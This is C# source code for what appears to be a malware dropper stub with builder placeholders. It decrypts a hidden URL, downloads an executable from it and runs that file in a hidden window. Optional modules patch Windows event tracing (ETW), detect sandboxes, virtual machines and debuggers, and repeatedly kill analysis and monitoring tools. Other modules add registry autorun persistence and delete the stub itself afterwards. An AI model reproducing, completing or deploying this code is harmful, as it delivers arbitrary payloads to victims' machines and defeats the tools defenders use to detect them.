using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;


namespace XStub
{
    internal class XLoad
    {
        static void Main(string[] args)
        {
            RuntimeExecution.XRuntime();  
        }
    }

    internal class Config
    {
        public static string XorKey = "%Xor_Key%";
#if MutexControl
        public static string Mutex = "%MutexValue%";
#endif

        public static string TargetUrl = EncryptEngine.StringMoar("%EncryptedUrl%", XorKey);
        public static string AppPath = Path.Combine(Environment.ExpandEnvironmentVariables("%PathToDrop%"), EncryptEngine.StringMoar("%EncryptedFileName%", XorKey));
    }

    internal class EncryptEngine
    {
        public static string StringMoar(string BytesString, string MoarKey)
        {
            byte[] inputBytes = Convert.FromBase64String(BytesString);
            byte[] keyBytes = Encoding.UTF8.GetBytes(MoarKey);
            byte[] outputBytes = new byte[inputBytes.Length];

            for (int i = 0; i < inputBytes.Length; i++)
            {
                outputBytes[i] = (byte)(inputBytes[i] ^ keyBytes[i % keyBytes.Length]);
            }
            return Encoding.UTF8.GetString(outputBytes);
        }
    }

    internal class CheckConnection
    {
        public static bool IsConnected(string host = "8.8.8.8", int timeout = 3000, int maxAttempts = 5, int delayBetweenAttempts = 2000)
        {
            int attempts = 0;

            while (attempts < maxAttempts)
            {
                try
                {
                    using (Ping ping = new Ping())
                    {
                        PingReply reply = ping.Send(host, timeout);

                        if (reply.Status == IPStatus.Success)
                        {
                            return true;
                        }
                    }
                }
                catch { }

                attempts++;
                Thread.Sleep(delayBetweenAttempts);
            }
            return false;
        }
    }

#if ETW_PATCHER
    internal class ETWPatcher
    {

        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        public static void Redirect(byte[] patchBytes)
        {
            try
            {
                uint previousProtection;
                var ntdllLibrary = LoadLibrary(Encoding.UTF8.GetString(Convert.FromBase64String("%ntdll_lib%")));
                var eventLib = GetProcAddress(ntdllLibrary, Encoding.UTF8.GetString(Convert.FromBase64String("%etwtrace%")));


                VirtualProtect(eventLib, (UIntPtr)patchBytes.Length, 0x40, out previousProtection);
                Marshal.Copy(patchBytes, 0, eventLib, patchBytes.Length);
            }
            catch
            {
                return;
            }
        }
    }
#endif

#if SelfDelete
    internal class SelfDelete
    {
        public static void SelfRemove()
        {
            var fileName = Process.GetCurrentProcess().MainModule.FileName;
            var folder = Path.GetDirectoryName(fileName);
            var currentProcessFileName = Path.GetFileName(fileName);

            var arguments = "/c timeout /t 1 && DEL /f " +currentProcessFileName;
            var processStartInfo = new ProcessStartInfo()
            {
                FileName = "cmd",
                UseShellExecute = false,
                CreateNoWindow = true,
                Arguments = arguments,
                WorkingDirectory = folder,
            };

            Process.Start(processStartInfo);
            Environment.Exit(0);
        }
    }
#endif

#if AntiAnyRun
    internal class AntiAnyRun
    {
        public static void AnyRun()
        {
            string[] array = { "Acrobat Reader DC.lnk", "CCleaner.lnk", "FileZilla Client.lnk", "Firefox.lnk", "Google Chrome.lnk", "Skype.lnk", "Microsoft Edge.lnk" };

            foreach (string fileName in array)
            {
                if (!File.Exists(Path.Combine(Environment.ExpandEnvironmentVariables("%systemdrive%"), "Users", "Public", "Desktop", fileName)))
                {
                    return;
                }
            }

            if (Environment.UserName.Equals("admin", StringComparison.OrdinalIgnoreCase) && Environment.MachineName.Contains("USER-PC"))
            {
                Environment.Exit(0);
            }
        }
    }
#endif

#if AntiAnalysis
    internal class AntiAnalysis
    {
        public static void RunAntiAnalysis()
        {
            if (DetectVirtualMachine() || DetectDebugger() || DetectSandboxie())
                Environment.FailFast(null);

            while (true)
            {
                DetectProcess();
                Thread.Sleep(10);
            }
        }

        private static bool DetectVirtualMachine()
        {
            using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
            {
                using (var items = searcher.Get())
                {
                    foreach (var item in items)
                    {
                        string manufacturer = item["Manufacturer"].ToString().ToLower();
                        if ((manufacturer == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
                            || manufacturer.Contains("vmware")
                            || item["Model"].ToString() == "VirtualBox")
                        {
                            return true;
                        }
                    }
                }
            }
            return false;
        }

        private static bool DetectDebugger()
        {
            bool isDebuggerPresent = false;
            CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
            return isDebuggerPresent;
        }

        private static bool DetectSandboxie()
        {
            if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
                return true;
            else
                return false;
        }

        private static void DetectProcess()
        {
            foreach (Process process in Process.GetProcesses())
            {
                try
                {
                    if (ProcessName.Contains(process.ProcessName))
                        process.Kill();
                }
                catch { }
            }
        }

        private readonly static List<string> ProcessName = new List<string>
        {"dnspy", "Mega Dumper", "Dumper", "PE-bear", "de4dot", "TCPView", "Resource Hacker", "Pestudio", "HxD", "Scylla",
        "de4dot", "PE-bear", "Fakenet-NG", "ProcessExplorer", "SoftICE", "ILSpy", "dump", "proxy", "de4dotmodded", "StringDecryptor",
        "Centos", "SAE", "monitor", "brute", "checker", "zed", "sniffer", "http", "debugger", "james",
        "exeinfope", "codecracker", "x32dbg", "x64dbg", "ollydbg", "ida -", "charles", "dnspy", "simpleassembly", "peek",
        "httpanalyzer", "httpdebug", "fiddler", "wireshark", "dbx", "mdbg", "gdb", "windbg", "dbgclr", "kdb",
        "kgdb", "mdb", "ollydbg", "dumper", "wireshark", "httpdebugger", "http debugger", "fiddler", "decompiler", "unpacker",
        "deobfuscator", "de4dot", "confuser", " /snd", "x64dbg", "x32dbg", "x96dbg", "process hacker", "dotpeek", ".net reflector",
        "ilspy", "file monitoring", "file monitor", "files monitor", "netsharemonitor", "fileactivitywatcher", "fileactivitywatch", "windows explorer tracker", "process monitor", "disk pluse",
        "file activity monitor", "fileactivitymonitor", "file access monitor", "mtail", "snaketail", "tail -n", "httpnetworksniffer", "microsoft message analyzer", "networkmonitor", "network monitor",
        "soap monitor", "ProcessHacker", "internet traffic agent", "socketsniff", "networkminer", "network debugger", "HTTPDebuggerUI", "mitmproxy", "python", "mitm", "Wireshark","UninstallTool", "UninstallToolHelper", "ProcessHacker", };

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
    }
#endif

    internal class CoreLoader
    {
        public static void Runtime()
        {
            if (CheckConnection.IsConnected())
            {
                if (FileIsDownloaded())
                {
                    if (!IsProcessRunning(Config.AppPath))
                    {
                        StartProcess(Config.AppPath);
                    }
                }
            }
        }
        
        public static bool FileIsDownloaded()
        {
            try
            {
                ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072 | (SecurityProtocolType)768;

                if (File.Exists(Config.AppPath))
                {
                    return true;
                }

                using (WebClient client = new WebClient())
                {
                    client.DownloadFile(Config.TargetUrl, Config.AppPath);
                }
                return File.Exists(Config.AppPath);
            }
            catch
            {
                return false;
            }
        }
        
        private static void StartProcess(string applicationPath)
        {
            var startInfo = new ProcessStartInfo()
            {
                FileName = applicationPath,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                UseShellExecute = false
            };

            Process.Start(startInfo);
        }

        private static bool IsProcessRunning(string processName)
        {
            string processNameWithoutExtension = Path.GetFileNameWithoutExtension(processName);
            return Process.GetProcessesByName(processNameWithoutExtension).Any();
        }
    }

#if MutexControl
    internal class MutexControl
    {
        public static void MutexRuntime()
        {
            string keyName = @"SOFTWARE\" + Config.Mutex;

            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(keyName);
            if (registryKey != null)
            {
                registryKey.Close();
                Environment.FailFast("");
            }
            else
            {
                Registry.CurrentUser.CreateSubKey(keyName);
            }
        }
    }
#endif

#if Autorun
    internal class AutorunManager
    {
        public static void AutorunRuntime()
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(EncryptEngine.StringMoar("%REG_AUTOSTART_KEY%", Config.XorKey), true))
            {
                if (key.GetValue("0606") == null)
                {
                    key.SetValue("0606", Config.AppPath);
                }
            }
        }
    }
#endif

    internal class RuntimeExecution
    {
        public static void XRuntime()
        {
            try
            {
#if Protect_Functions
            SecurityRuntime();
#endif
                CoreLoader.Runtime();
            }
            catch { }
#if SelfDelete
            finally { SelfDelete.SelfRemove(); }
#else
            finally { Environment.Exit(0); }
#endif
        }

#if Protect_Functions
        public static void SecurityRuntime()
        {
#if ETW_PATCHER
            ETWPatcher.Redirect(new byte[] { 0xc2, 0x14, 0x00 });
#endif

#if MutexControl
            MutexControl.MutexRuntime();
#endif

#if AntiAnyRun
            AntiAnyRun.AnyRun();
#endif

#if AntiAnalysis
            new Thread(() => { AntiAnalysis.RunAntiAnalysis(); }).Start(); 
#endif

#if Autorun
            AutorunManager.AutorunRuntime();
#endif
        }
#endif
    }
}
